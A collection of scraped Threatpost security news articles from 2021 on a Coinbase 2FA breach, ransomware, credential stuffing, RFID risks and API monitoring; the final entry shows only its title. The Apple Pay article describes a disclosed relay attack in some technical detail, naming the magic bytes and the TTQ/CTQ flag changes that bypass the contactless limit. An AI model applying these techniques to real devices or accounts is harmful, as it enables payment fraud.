[
    {
        "title": "MFA Glitch Leads to 6K+ Coinbase Customers Getting Robbed",
        "author": "Lisa Vaas",
        "date": "October 1, 2021 4:08 pm",
        "text": "Coinbase suspects phishing led to attackers getting personal details needed to access wallets but also blamed a flaw in its SMS-based 2FA.\nThe accounts of at least 6,000 Coinbase customers were robbed of funds after attackers bypassed the cryptocurrency exchange’s multi-factor authentication (MFA).\nAccording to a notification letter (PDF) Coinbase sent to affected customers and filed with the California state Attorney General’s office, the theft happened between March and May 20, 2021.\nThe attacker(s) used a flaw in Coinbase’s account recovery process to seize the SMS two-factor authentication tokens needed to break into customers’ accounts and transfer funds to crypto wallets unassociated with Coinbase.\nIn order to pull it off, the culprits first needed access to victims’ email addresses, passwords, phone numbers and personal email inboxes. Coinbase doesn’t know exactly how the third parties gained access to all that, but the exchange doesn’t think it’s to blame: “We have not found any evidence that these third parties obtained this information from Coinbase itself,” according to the exchange’s breach notification.\nCoinbase noted that such information is often gleaned through phishing attacks or other social engineering techniques that trick victims into disclosing their login credentials.\nCoinbase Phishing Attacks Are Rising\nIn fact, earlier this week, on Monday, Coinbase warned that phishing attacks are on the rise, both in terms of volume and success rates. Between April and early May 2021, its security team saw a “significant uptick” in Coinbase-branded phishing messages that targeted users of a range of commonly used email service providers: attacks that “demonstrated a higher degree of success” at bypassing spam filters of certain older email services.\nCoinbase provided samples of the phishing attacks its team has seen, including the ones shown below:\n“Locked account” phishing email, designed to alarm the recipient into clicking without taking the time to verify other aspects of the message.\nSource: Coinbase.\nFor some victims with Hotmail accounts, attackers attempted to add a malicious application to the user’s inbox. If the recipient clicked “Yes,” an attacker would be able to read all the user’s emails (including password reset and device verification emails sent by Coinbase). Source: Coinbase.\nClearly, cryptocurrency thieves are nothing if not creative, and understandably so: They’re going after a lucrative, juicy target. While they’re considered a secure place for users to store their cryptocurrency assets, researchers in 2018 proved that wallets such as Ledger and Trezor are vulnerable to a number of cyber attacks.\nSubsequent events proved their point: In July 2020, an unauthorized third party accessed Ledger’s e-commerce and marketing database, which held email addresses as well as contact and order details including first and last name, postal address, email address, and phone number.\nFollowing the July attack, researchers discovered widespread campaigns spreading malicious browser extensions that were abusing Google Ads and well-known cryptocurrency brands including Ledger to lure victims and eventually steal their cryptocurrency wallet credentials. Other wallets targeted in the campaign included Electrum, Exodus, Jaxx, KeepKey, MetaMask, MyEtherWallet and Trezor.\nAs well, the rise of cryptocurrency has made compromised crypto accounts hugely valuable in Dark Web marketplaces, according to the 2021 Dark Web price index from Privacy Affairs.\n“Due to the skyrocketing prices of Bitcoin and other cryptocurrencies, hacked accounts may hold large sums of coin-based currency and cash, protected by relaxed security measures after the initial verification process,” according to the report, which listed the average price for a hacked Coinbase-verified account to be $610.\nSMS 2FA Authentication Flaw\nTL;DR: There are a lot of ways that the attackers could have gotten Coinbase users’ personal details.\nBut beyond the personal information they needed to crack victims’ accounts, the thieves needed more. For customers who use SMS texts for two-factor authentication (2FA), the unauthorized third parties had to leverage what Coinbase called a flaw in its SMS account recovery process, in order to receive an SMS 2FA token so as to gain access to accounts.\nCoinbase didn’t go into detail about the flaw: It only said that as soon as it learned about the issue, it “updated our SMS Account Recovery protocols to prevent any further bypassing of that authentication process.”\nIn a guide on securing accounts, Coinbase recommends enabling MFA authentication using security keys or Time-based One Time Passwords (TOTP) with an authenticator app. Verification via SMS text messages is listed as an option, but with caveats: This verification is, after all, subject to SIM-swap or phone-port attack.\nSIM swapping is a form of fraud that allows crooks to bypass SMS-based 2FA and crack online banking or other high-value accounts such as cryptocurrency wallets. In a typical scenario, an attacker would start by phishing personal and banking information – often via SMS phishing, which has the added benefit of confirming that a victim’s cell phone number is an active line. Next, an attacker calls the victim’s mobile carrier – easily discovered with an online search – and convinces a service rep to port the line to a different SIM card/device.\nCan We Please Just Ditch SMS-Based 2FA?\nExperts agree that we should stick a fork in SMS-based 2FA: It’s clearly toast.\nRoger Grimes, author of “Hacking Multifactor Authentication” and data-driven defense evangelist, for KnowBe4,  said that this has got to be at least the third or fourth time that Coinbase customers have been compromised. While all MFA solutions can be hacked multiple ways, SMS-based MFA are “among the most hackable MFA solutions,” he said.\nIt isn’t exactly breaking news. In 2017, the NIST Digital Identity Guidelines said that SMS-based MFA was very weak and shouldn’t be used to protect valuable data and content, going so far as to reserve the right  to remove it as an allowed MFA solution completely in the future.\nIn spite of that, “SMS-based MFA is probably the most used MFA solution on the internet today,” Grimes said. He blames vendors who force users to rely on SMS-based MFA because that’s what the vendor uses.\n“Almost all the users that do use SMS-based MFA do not know how easily it is hacked,” Grimes contended, which is an issue with all MFA solutions. “Users are not told how each type can be still be hacked, abused and bypassed, sometimes easily so, and this leads to most users thinking they are being super secure because they are using MFA and far less hackable, when that is absolutely not the case.”\nGrimes thinks that the MFA solution lies in making sure “that  all stakeholders (e.g., management, buyers, implementers, sysadmins, users, etc.) understand what the potential weaknesses are for their particular type of MFA, and everyone is educated about possible attacks and how to avoid them.”\nChris Clements, vice president of solutions architecture for Cerberus Sentinel, added that it’s incumbent on cryptocurrency users  to understand that they’re constantly being targeted by cybercriminals attempting to rob them.\nAnd once those funds are gone, they’re gone for good, Clements said. “The decentralized nature of most coins means that if criminals are successful in stealing them, there’s very little chance you will be able to recover your losses,” he said.  “As such, it’s important that users of cryptocurrency study up and implement appropriate opsec to protect themselves from the inevitable attacks, including ensuring that any computing devices or smartphones are hardened and up to date with the latest security patches and implementing strong unique passwords as well as multi-factor authentication controls such as TOTP or hardware security keys like FIDO.  Finally, cold wallets kept completely offline are useful for limiting much easier online attack vectors.”\nCoinbase Makes Good on the Money\nCoinbase said that it will deposit funds back into victims’ accounts, “equal to the value of the currency improperly removed from your account at the time of the incident.” Some customers have already been reimbursed, the exchange said, promising that customers will receive “the full value of what you lost.”\nThe exchange is also providing free credit monitoring to affected customers.\nCoinbase encouraged users of SMS-based authentication to drop it and to instead use stronger MFA, including TOTP or a hardware security key. It also strongly encouraged victims to change their Coinbase account password to a new, strong and unique password: one that’s not used on any other site.\nThe same goes for email accounts: “Because the third parties needed access to your personal email account as part of this incident, we strongly encourage you to change your password in the same way for your email account and for any other online accounts where you use a similar password,” the exchange advised.\nCheck out our free upcoming live and on-demand webinar events – unique, dynamic discussions with cybersecurity experts and the Threatpost community.\nWrite a comment\nShare this article:\nBreach\nHacks\nMobile Security\nVulnerabilities"
    },
    {
        "title": "Military’s RFID Tracking of Guns May Endanger Troops",
        "author": "Becky Bracken",
        "date": "September 30, 2021 3:32 pm",
        "text": "RFID gun tags leave the military exposed to tracking, sniffing and spoofing attacks, experts say.  \nReports that the military has started outfitting firearms with RFID tags for tracking have raised security alarms.\nThe concern: What if the enemy uses the tags to track soldiers on the battlefield?\nThe Department of Defense, the Marines and the Navy have already rejected the RFID tagging tech for that specific reason, according to the AP. However, five Air Force bases are operating at least one RFID armory, along with a Florida-based Green Beret unit that uses RFID in what officials said were a “few” armories.\nWhen the AP questioned the Navy about its use of RFID tags to track weapons, spokesman Lt. Lewis Aldridge said the tech “didn’t meet operational requirements” and would not be rolled out further throughout the service branch, according to the report.\nTagging the guns keeps them from being stolen or sold to civilians, according to the AP, which added that the tags also make labor-intensive tasks like counting and checking weapons in and out practically instantaneous.\nBut the security downside to that convenience is potentially enormous.\nRFID Security Risks\nCapt. Andrew Wood succinctly framed the concerns when he told the AP that the RFID tags “[increase] the digital signature of Marines on a battlefield, increasing the security/force protection risks.”\nSecurity experts who talked to the AP said the tags would be detectable up to a much farther distance than advertised, meaning adversaries could track troop movements, make fake RFID tags and more.\nTod Beardsley, director of research at Rapid7, told Threatpost that the danger depends on the specific technology deployed. He pointed out the distinction between RFID tags that require a reader to activate, vs. tags that are outfitted with their own power source.\n“The kinds of RFID tags that are used in retail settings and warehouses are nearly always activated by the reader because they’re cheap and they don’t have their own power source,” Beardsley explained. “Imagine an access badge – you have to hold the badge within a couple of centimeters of a door lock for the reader to power and read the badge, but it doesn’t work when the badge is in your pocket.”\nOn the other hand, Beardsley said, if tags are equipped to send out their own signals, the security concerns are real.\n“Self-powered RFID tags [that] have a battery and beacon out with their own signals can be read much further away since it all comes down to the reader’s sensitivity and directionality,” Beardsley added. “With the right equipment. you could read an active RFID tag from a couple of hundred meters away without much problem.”\nFrequency could also be a big factor, he said.\n“In other words, some RFID tags can be read from much longer distances than the manufacturer intends, while other RFID tags cannot be read from distances over a few meters, tops, no matter how much power you’re putting behind the reader,” Beardsley explained. “RFID tags aren’t magical; they have physical limitations based on their design.”\nConvenience Over Warfighter Security\nMaor Franco, senior director at Pentera, told Threatpost that he views this as a classic case of convenience being put before security. He also warned that tracking isn’t the only security concern with RFID technology. Attacks including sniffing and RFID spoofing should also be considered threats.\n“Operational Technology (OT) controls, such as medical devices, and Industrial Controls Systems (ICS) are more connected and open than ever before, and increasingly targeted by nation-state and criminal groups,” Franco said. “In this case of RFID, with proximity obstacles removed, different attacks such as RFID sniffing and spoofing are enabled. The most dangerous in the case of weapons is tracking, where the location and movement of an object/person can be recorded relatively easily – even in the case of encrypted messages.”\nWilliam Malik, VP of infrastructure strategies with Trend Micro, told Threatpost that the military routinely blocks location trackers around sensitive installations, and this should be no different.\n“RFID tracking devices make life easier for the logistics management function and the quartermaster but make life a lot more dangerous for the warfighter,” Malik said. “As with wearing a FitBit while jogging outside a covert military base or carrying an active cell phone into a secure installation, location identification and tracking technologies give away far too much information to be safely used in combat.”\nCheck out our free upcoming live and on-demand webinar events – unique, dynamic discussions with cybersecurity experts and the Threatpost community.\nWrite a comment\nShare this article:\nGovernment\nHacks\nWeb Security"
    },
    {
        "title": "Tips & Tricks for Unmasking Ghoulish API Behavior",
        "author": "Jason Kent",
        "date": "September 30, 2021 1:56 pm",
        "text": "Jason Kent, hacker-in-residence at Cequence Security, discusses how to track user-agent connections to mobile and desktop APIs, to spot malicious activity.\nI was analyzing one of my customer’s API traffic the other day and I noticed something odd about the devices that were using the mobile application API. I found standard browsers like Firefox and Chrome hitting API endpoints that should only be touched by their mobile-application communication.\nIn the application development world, we call browsers “user agents (UA)” or “user-agent strings.” For example, when an analyst looks at a batch of web logs, they would see the user agent for Chrome appearing as “Mozilla/5.0 (Macintosh; Intel Mac OS X 11_5_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36.” This is a user sitting in front of a laptop or desktop with Chrome open, browsing the web.\nOn a mobile application, the development staff will create a user agent for their application. It can be something like “CoolAppV1-iPhone,” or anything else they want to use. The iPhone and Android user agents are often different, but they are almost always a hand-coded string that means something to the developers.\nIn this way you can track what kind of devices are hitting the APIs. Which is helpful, because I recommend that the API endpoints that the mobile applications and the web applications be completely different.\nSeparate Mobile and Web Domains\nThat’s because using generic terms that only your team knows in order to separate mobile and web domains makes it easier for you to spot malicious behavior.\nFor instance, iPhone or Android apps might communicate with app.example.com, while the website is www.example.com. This separation of subdomains and application flow allows us to see where the UA outliers might be.\nFor instance, if I see Chrome browser activity on a laptop showing up on app.example.com, I know something is up. It could be a developer testing their work, but this is unlikely in production. It could be a fluke, but flukes are rare in security. Most likely, someone has taken the app communication apart and is poking around.\nSimilarly, if you have a web application that is typically used via a web browser, analyzing the types of browsers that land on your page is important. Threat actors will commonly try to hide in plain sight by manipulating, or rotating through a high number of UAs. Lately we are seeing browsers that look like “Ruby” or “HTTP” but they are not actual user-agent strings.\nBeware of Crawlers\nUAs are also common targets for known “crawlers” like Facebook (facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)), which crawl various places on a website but should rarely be seen in your mobile app flow.\nThe only communication that should be touching your mobile application are the mobile applications installed on your user’s phones. If you are seeing crawlers on your mobile application, you might have a problem elsewhere. It could be that somehow the endpoints are being learned by the Facebook crawler as it indiscriminately finds and tests URIs.\nIf you see suspicious activity on your UAs, you should look for possible errors like comments with URIs in them, advertised routes, or code repos publicly exposed or within your application paths. A public crawler on your application fabric is commonly a precursor to traffic from threat actors.\nCheck for Suspicious Patterns in Your Application Logs\nAs a simple first step, analyze the UAs most prevalent in your application logs. If you are seeing odd or extremely old user-agent strings, you might have a threat actor poking around. Periodic log reviews are critical in discovering potentially malicious patterns. Having a systematic way to review these items and raise alarms, if needed, can effectively minimize the malicious traffic on your web and mobile applications.\nBottom line: Security often boils down to analysis of everyday things in order to notice patterns and put mitigations in place that keep the environment safe.\nJason Kent is hacker-in-residence at Cequence Security.\nEnjoy additional insights from Threatpost’s Infosec Insiders community by visiting our microsite.\nWrite a comment\nShare this article:\nCloud Security\nInfoSec Insider\nVulnerabilities\nWeb Security"
    },
    {
        "title": "Baby’s Death Alleged to Be Linked to Ransomware",
        "author": "Lisa Vaas",
        "date": "September 30, 2021 1:08 pm",
        "text": "Access to heart monitors disabled by the attack allegedly kept staff from spotting blood & oxygen deprivation that led to the baby’s death.\nA U.S. hospital paralyzed by ransomware in 2019 will be defending itself in court in November over the death of a newborn, allegedly caused by the cyberattack.\nAs the Wall Street Journal reported on Thursday, the baby’s mother, Teiranni Kidd, gave birth to her daughter, Nicko Silar, on July 16, 2019, without knowing that the hospital was entering its eighth day of clawing its way back from the attack.\nAccording to court filings, health records at the hospital – Springhill Medical Center, in Mobile, Ala. – were inaccessible. A wireless tracking system for locating medical staff was still down. And, in the labor-and-delivery unit, staff were cut off from the equipment that monitors fetal heartbeats, which are normally tracked on a large screen at the nurses’ station and in the delivery room.\nThose monitors should have informed the staff of what was a life-threatening situation, alleges a medical malpractice lawsuit that Kidd has filed in the Circuit Court of Mobile County. Nicko was born with the umbilical cord wrapped around her neck, choking off her blood and oxygen. She suffered severe brain damage and died nine months later.\nIn a text conversation submitted in court filings and reproduced below, the attending obstetrician, Dr. Katelyn Parnell, told the nurse manager that she would have delivered Nicko via caesarean section if she’d been able to see the heart monitor’s readout.\n“I need u to help me understand why I was not notified,” Parnell texted, followed by “This was preventable.”\nSource: Court filings, via the Wall Street Journal.\nThe suit has named both Springhill and Parnell as defendants. It alleges that the ransomware attack erased what the WSJ called the “extra layer of scrutiny” that the heart-rate monitor would have provided at the nurses’ station.\nThe hospital has denied any wrongdoing. Springhill CEO Jeffrey St. Clair told the WSJ that the hospital handled the attack appropriately, staying open as “our dedicated healthcare workers continued to care for our patients, because the patients needed us; and we, along with the independent treating physicians who exercised their privileges at the hospital, concluded it was safe to do so.”\nIn court filings, Parnell said that she had been aware of the cyberattack, but “believed Ms. Kidd could safely deliver her baby at Springhill” at the time she was admitted.\nA Tragic Legal First\nThis isn’t the first time that ransomware-related homicide charges have been brought, but it will be the first time that a case makes it to court. The closest yet was an incident from last September, when a German patient died while in an ambulance that had been re-routed due to a hospital having been seized by ransomware.\nAt the time, German police launched a negligent-homicide investigation and said they might hold the attackers responsible. It would have been the first time that law enforcement had considered a cyberattack to be directly responsible for a death, but it was subsequently determined that the patient died of other causes, leading a German prosecutor to drop the murder charge.\nWho’s Behind the Allegedly Murderous Attack?\nSpringhill has declined to name the ransomware that was behind the July 2019 attack, but given the timing and the lack of scruples in targeting a healthcare facility, there are plenty of possibilities.\nOne could be the Ryuk gang, whose operators do have a track record for not being able to keep their hands off of medical facilities. Between 2019 and 2020, Ryuk malware affected hospitals in California, New York and Oregon, as well as in Germany and the U.K., resulting in difficulties with accessing patient records and impairment in critical care.\nCase in point: Last September 2020, employees at Universal Health Services (UHS), a Fortune-500 owner of a nationwide network of hospitals, reported widespread outages that resulted in delayed lab results, a fallback to pen and paper, and patients being diverted to other hospitals. The culprit turned out to be the Ryuk ransomware, which locked up hospital systems for days.\nBeyond Ryuk, there are plenty more ransomware operators who lack scruples, as has been made clear during the pandemic.\nFor example, multiple ransomware gangs pledged not to hit hospitals because of COVID-19, including the Maze and DoppelPaymer groups. They also pledged to release free decryption keys if medical facilities were accidentally hit. But some groups – such as Netwalker – actually reneged on those pledges.\nIn fact, such attacks skyrocketed last October, in the middle of another U.S. COVID-19 surge, to the point that the U.S. Cybersecurity and Infrastructure Security Agency (CISA), the Federal Bureau of Investigation (FBI) and the U.S. Department of Health and Human Services issued a security bulletin warning of “credible information of an increased and imminent cybercrime threat to U.S. hospitals and healthcare providers.”\nCheck out our free upcoming live and on-demand webinar events – unique, dynamic discussions with cybersecurity experts and the Threatpost community.\nWrite a comment\nShare this article:\nHacks\nMalware\nWeb Security"
    },
    {
        "title": "Innovative Proxy Phantom ATO Fraud Ring Haunts eCommerce Accounts",
        "author": "Tara Seals",
        "date": "September 30, 2021 1:05 pm",
        "text": "The group uses millions of password combos at the rate of nearly 2,700 login attempts per minute with new techniques that push the ATO envelope.\nA sophisticated fraud ring, dubbed Proxy Phantom, has pushed the boundaries of credential-stuffing attacks with a dynamic account takeover (ATO) technique that was flooding eCommerce merchants in the third quarter.\nResearchers at Sift uncovered the group, which is innovating in the realm of large-scale, automated ATO attacks, they said. Specifically, Proxy Phantom specializes in using a massive cluster of connected, rotating IP addresses to automatically try more than 1.5 million stolen username and password combinations against various log-in screens. The third-quarter attacks affected dozens of online merchants, but the next targets could be in any number of sectors.\n“The group flooded businesses with bot-based login attempts to conduct as many as 2,691 log-in attempts per second—all coming from seemingly different locations,” the researchers explained in a Thursday analysis. “As a result, targeted merchants … would be forced to play a supercharged, global game of whack-a-mole, with new combinations of IP addresses and credentials coming for them at an unthinkable pace.”\nThe username/password combos were likely purchased in bulk on the Dark Web, the report noted. Ongoing credential theft and the collation of multiple breaches into vast collections has made underground forums home to a wonderland of login offerings, fueling an ongoing ATO boom. But what really set the Proxy Phantom attacks apart was the use of dynamically generated IP addresses from which it launched the campaigns.\nResearchers observed several large IP clusters (networks of connected IPs) blossoming across the web, with one of them ballooning 50-fold within the space of one quarter. Many of these were “originating from a known, high-risk ISP, and indicating a fraud ring in action,” they noted.\n“While it’s inevitable that will grow over time, this specific one exploded in size,” according to Sift. “In analyzing its traffic, our data scientists discovered that the cluster was centered around just a few proxy servers, and connected to scores of attempted, failed logins—pointing to automation and proxy IP rotation within the same address space.”\nThis is a remodel of typical ATO techniques that’s aimed at making a greater impact, researchers noted. Simultaneously and rapidly switching IP addresses helps cyberattackers to hide the origin of the attacks, while also evading detection from typical rules-based fraud prevention systems.\n“Typically, fraud rings use a handful of IP addresses or hosts and cycle through a large list of stolen user credentials to breach a merchant’s security measures,” according to the firm. “By leveraging automation for both credential and IP address rotation, this ring exhibited a major evolution of the classic blitz ATO attack.”\nThe fraud-detection evasion is particularly concerning, the analysis pointed out, because the sheer volume of login attempts could end up fogging security systems altogether.\n“These types of next-gen attacks could crush a merchant…leaving them stuck trying to block one IP address after another and trying to catch up to a machine that rotates data faster than any human or static rules could,” according to the firm. “Worse, it could overwhelm those rules — as more IPs show up and fail at breakneck speed, rules designed to assess risk will begin to identify everything as suspicious, deeply undermining the accuracy of the system.”\nATO Attacks See Staggering Uptick\nSift also released its Q3 2021 Digital Trust & Safety Index on Thursday, which shows that ATO attacks have tripled (up 307 percent) just since April 2019.\nThis attack method made up 39 percent of all fraud blocked on Sift’s network in Q2 2021 alone, the company noted.\n“Fraudsters will never stop adapting their techniques to overwhelm traditional fraud prevention, making suspicious logins look legitimate, and legitimate ones look suspicious,” said Jane Lee, trust and safety architect at Sift, in a statement. “At the same time, poor consumer security habits—like reusing passwords for multiple accounts—make it easy and continue to breathe life into the fraud economy.”\nThe fintech and financial services sector in particular is under attack, the report found. ATO attacks in this vertical skyrocketed a staggering 850 percent between Q2 2020 and Q2 2021, “mainly driven by a concentration on crypto exchanges and digital wallets, where fraudsters would likely try to liquidate accounts or make illicit purchases,” Sift found.\nAdditionally, nearly half (49 percent) of consumers surveyed as part of the report feel most at risk of ATO on financial services sites compared with other industries, with a full quarter of ATO victims noting their compromises came via financial services sites.\nThe report also found that victims of ATO fraud are usually in for a long haul of misery. For instance, almost half (48 percent) of ATO victims have had their accounts compromised between two and five times.\nIn each attack, 45 percent had money stolen from them directly, while 42 percent had a stored payment type used to make unauthorized purchases. More than one in four (26 percent) lost loyalty credits and rewards points to fraudsters.\nNearly one in five (19 percent) of victims are unsure of the consequences of their accounts being compromised – perhaps because cybercriminals used the accounts for testing.\n“More often than not, nothing happens to corrupted accounts immediately after they’ve been hacked – no unauthorized purchases, no stolen loyalty points, and no attempts to update passwords,” according to the report. “And that’s because they’re being used for something even more valuable.”\nTo wit: active accounts offer the most prolonged cover for fraudsters to perform card testing, as well as test the user’s credentials across their other high-value accounts, which may use the same information.\n“Fraudsters can use this veiled position to verify associated addresses and other personal customer data, correlate security codes and password hints, discover other cards on file to target and reveal connected accounts or apps – all without making a purchase or otherwise tipping their hand,” Sift noted.\nCheck out our free upcoming live and on-demand webinar events – unique, dynamic discussions with cybersecurity experts and the Threatpost community.\nWrite a comment\nShare this article:\nMost Recent ThreatLists\nWeb Security"
    },
    {
        "title": "Apple Pay with Visa Hacked to Make Payments via Locked iPhones",
        "author": "Tara Seals",
        "date": "September 30, 2021 11:26 am",
        "text": "Researchers have demonstrated that someone could use a stolen, locked iPhone to pay for thousands of dollars of goods or services, no authentication needed.\nAn attacker who steals a locked iPhone can use a stored Visa card to make contactless payments worth up to thousands of dollars without unlocking the phone, researchers are warning.\nThe problem is due to unpatched vulnerabilities in both the Apple Pay and Visa systems, according to an academic team from the Universities of Birmingham and Surrey, backed by the U.K.’s National Cyber Security Centre (NCSC). But Visa, for its part, said that Apple Pay payments are secure and that any real-world attacks would be difficult to carry out.\nThe team explained that fraudulent tap-and-go payments at card readers can be made using any iPhone that has a Visa card set up in “Express Transit” mode. Express Transit allows commuters around the world, including those riding the New York City subway, the Chicago El and the London Underground, to tap their phones on a reader to pay their fares without unlocking their devices.\n“An attacker only needs a stolen, powered-on iPhone,” according to a writeup (PDF) published this week. “The transactions could also be relayed from an iPhone inside someone’s bag, without their knowledge. The attacker needs no assistance from the merchant.”\nIn a proof-of-concept video, the researchers showed a £1,000 payment being sent from a locked iPhone to a standard, non-transit Europay, Mastercard and Visa (EMV) credit-card reader.\n“Logically, it’s an interesting advancement of tapping a contactless card machine against someone’s wallet/purse in their back pocket on the subway/metro,” Ken Munro, researcher with Pen Test Partners, told Threatpost. “However, I’m more concerned about the threat of fraud with a stolen phone. In the past, the PIN would have prevented fraud from a stolen phone. Now, there’s a valid attack method that makes theft of a phone with Express Transit enabled really quite valuable.”\nExploiting Apple Pay Express Transit Mode\nThe attack is an active man-in-the-middle replay and relay attack, according to the paper. It requires an iPhone to have a Visa card (credit or debit) set up as a transit card in Apple Pay.\nThe attackers would need to set up a terminal that emulates a legitimate ticket barrier for transit. This can be done using a cheap, commercially available piece of radio equipment, researchers said. This tricks the iPhone into believing it’s connecting to a legitimate Express Transit option, and so, therefore, it doesn’t need to be unlocked.\n“If a non-standard sequence of bytes (Magic Bytes) precedes the standard ISO 14443-A WakeUp command, Apple Pay will consider this [to be] a transaction with a transport EMV reader,” the team explained.\nOnce this malicious reader-spoofing terminal is live, the next step is to intercept and relay the payment-authorization signals from Apple Pay via the emulator to everyday, non-transit contactless payment readers – such as those found in shops. This is something the researchers were able to do with a special application they created, running on an Android phone. The application modifies the communications coming to and from the iPhone.\n“While relaying the EMV messages, the Terminal Transaction Qualifiers (TTQ) sent by the EMV terminal need to be modified,” they explained. Specifically, it turns on the “Offline Data Authentication (ODA) for Online Authorizations” feature as well as the “EMV mode supported” setting.\n“These modifications are sufficient to allow relaying a transaction to a non-transport EMV reader, if the transaction is under the contactless limit,” according to the writeup. The contactless limit is the top payment amount someone can make using the technology without officially authenticating to the phone via biometrics or passcode.\nHowever, the researchers found that they could also make transactions over the contactless limit with just another tweak to the communications. To do so, “the Card Transaction Qualifiers (CTQ) sent by the iPhone, need to be modified such that the bit (flag) for Consumer Device Cardholder Verification Method is set…The CTQ value appears in two messages sent by the iPhone and must be changed in both occurrences.”\nThey explained, “This tricks the EMV reader into believing that on-device user authentication has been performed (e.g. by fingerprint).”\nFurther, because it’s a relay attack, Munro pointed out that the card machine receiving the payment could be anywhere in the world as long as it’s connected to the internet.\n“Now, one doesn’t need the card machine to be present, as the transaction can be relayed elsewhere,” he said. “Is that a likely attack? Possibly.”\nThe academic team posted a PoC demo video:\nVideo Player\nhttps://media.threatpost.com/wp-content/uploads/sites/103/2021/09/30110937/relay_explained.mp4\n00:00\n00:00\nVisa, Apple Pay Flaws Remain Unpatched\nThis attack is made possible by a combination of flaws in both Apple Pay and Visa’s systems, the academic team noted.\n“The details of this vulnerability have been disclosed to Apple (Oct 2020) and to Visa (May 2021),” according to the writeup. “Both parties acknowledge the seriousness of the vulnerability, but have not come to an agreement on which party should implement a fix.”\nHowever, Visa and Apple aren’t exactly “acknowledging the seriousness” of the problem, considering their official statements regarding the findings.\n“Variations of contactless-fraud schemes have been studied in laboratory settings for more than a decade and have proven to be impractical to execute at scale in the real world,” Visa said in a statement to the BBC, adding that its fraud-detection systems would flag any suspicious transactions.\nApple meanwhile shifted the responsibility to Visa and told the outlet, “We take any threat to users’ security very seriously. This is a concern with a Visa system, but Visa does not believe this kind of fraud is likely to take place in the real world given the multiple layers of security in place. In the unlikely event that an unauthorized payment does occur, Visa has made it clear that their cardholders are protected by Visa’s zero-liability policy.”\nHowever, in the paper, the researchers said that fraud detection seems futile in the face of the attack: “back-end fraud detection checks have not stopped any of our test payments,” they wrote.\nMunro noted that the issues should be addressed, but that for now, users can protect themselves by not using Visa as a transport card in Apple Pay, and if they do, by remotely wiping the device if lost or stolen.\n“I find it amazing that Apple and Visa are arguing about who should fix the issue,” he told Threatpost. “In the meantime, consumers have little choice but to switch off Express Travel Card mode. So, my advice is disable the payment mode until Visa and Apple sort their act out. It’s in Settings > Wallet & Apple Pay > Express Travel Card.”\nPhone-wiping can be accomplished via Find My iPhone and iCloud.\nThe bug does not affect other types of payment cards or payment systems – Mastercard on Apple Pay or Visa on Samsung Pay, for instance, are safe from such attacks, the researchers noted.\nCheck out our free upcoming live and on-demand webinar events – unique, dynamic discussions with cybersecurity experts and the Threatpost community.\n  Write a comment\nShare this article:\nHacks\nMobile Security\nVulnerabilities"
    },
    {
        "title": "The Top Ransomware Threats Aren’t Who You Think",
        "author": "Becky Bracken",
        "date": "September 30, 2021 8:50 am",
        "text": "Move over REvil, Ragnar Locker, BlackMatter, Conti et al: Three lesser-known gangs account for the vast majority of ransomware attacks in the U.S. and globally.\nWhile there seem to be legions of ransomware gangs, it turns out that just a handful of ransomware-as-a-service (RaaS) actors dominate the entire ecosystem of encryption-attack threats.\nIn fact, just three ransomware families, none of them household names, make up 64 percent of all threats detected, according to telemetry data collected by Bitdefender during August: WannaCryptor, Stop/DJVU and Phobos.\nA report from Bitdefender out this week looked at 19.8 million malware detections collected by its telemetry to find insights about the current ransomware threat landscape. The team of analysts were able to identify a total of 250 different ransomware families, but just three dominated the field in terms of sheer attack volume.\nTop Ransomware Groups\nWannaCryptor accounted for a full 30 percent of threats, Stop/DJVU was behind 19 percent and Phobos trailed just behind with 15 percent.\nNone of these has made loads of headlines with high-profile attacks, but Phobos was listed as a top ransomware threat in a Joint Cybersecurity Advisory put out by the U.S. government ahead of Labor Day weekend. The feds at the time said that threat actors were likely to strike during the holiday, while most workers were on vacation.\nOthers on Bitdefender’s list include BearCrypt, Locker, Avaddon, BrainCrypt, GoldenEye, Cerber and Lockbit. In terms of this “best of the rest” group, it should be noted that Avaddon announced it was releasing decryptors in June and said it was shutting down its RaaS operations. Apparently, its plans changed, since it was highly active in August.\nSource: Bitdefender.\nLockbit, one of the better-known names on the list, was behind a late August attack on Bankok Airways and published the sensitive files after the airline refused to pay up. The attack was reportedly linked to an Accenture breach earlier in the month.\nCerber was also listed in an August SonicWall analysis as one of the top threats for the first half of 2021. That same report fingered the highly active Ryuk as leading the way in terms of attack volume, with the older SamSam gang rounding out the top three. The latter two don’t make Bitdefender’s top 10, however.\nRaaS Operators Prefer High-Volume Attacks\nWith the headlines that groups like REvil, Ragnar Locker, BlackMatter and Conti make, one would think their attacks represent the greatest threat to businesses. But those attacks are rare and highly targeted, go after ransoms in the millions of dollars, and take weeks or even months of recon and preparation.\nThe higher-volume attacks are instead carried out by ransomware affiliates looking for quick strikes and low-hanging fruit, many of them aimed at smaller businesses.\n“Opportunistic adversaries and RaaS groups will represent a higher percentage compared to groups that are more selective about their targets, since they prefer more volume instead of higher value,” the report said.\nMany of the attacks might be limited, or less impactful. The report analyzed detected malware, rather than the extent of the infections within a given company, the researchers added.\n“We are only counting total cases, not considering how significant the impact of infection is,” the wrote.\nRansomware by the Numbers\nThe rank of industries most targeted by ransomware is dominated by telecommunications companies, with 51 percent of ransomware threats detected.\n“Telecommunications services are particularly high as their customers are included within the detections,” the analysts explained.\nLumbering legacy organizations like utilities only accounted for 1 percent of threats detected. And tech companies were only targeted by 7 percent of ransomware threats, the report showed.\nSource: Bitdefender.\nWhen it comes to geography, the report put the U.S. at the top of the list of countries being bombarded by ransomware, accounting for a full 30 percent of detections. India and Brazil follow, making up 17 percent and 15 percent, respectively.\nSource: Bitdefender.\nWhile detection isn’t the same as an infection, the results show the ransomware game continues to be dominated by handful of RaaS groups launching mass attacks on unsuspecting users and organizations.\nCheck out our free upcoming live and on-demand webinar events – unique, dynamic discussions with cybersecurity experts and the Threatpost community.\nWrite a comment\nShare this article:\nNews"
    },
    {
        "title": "Thousands of University Wi-Fi Networks Expose Log-In Credentials",
        "author": "Elizabeth Montalbano",
        "date": "September 30, 2021 7:29 am",
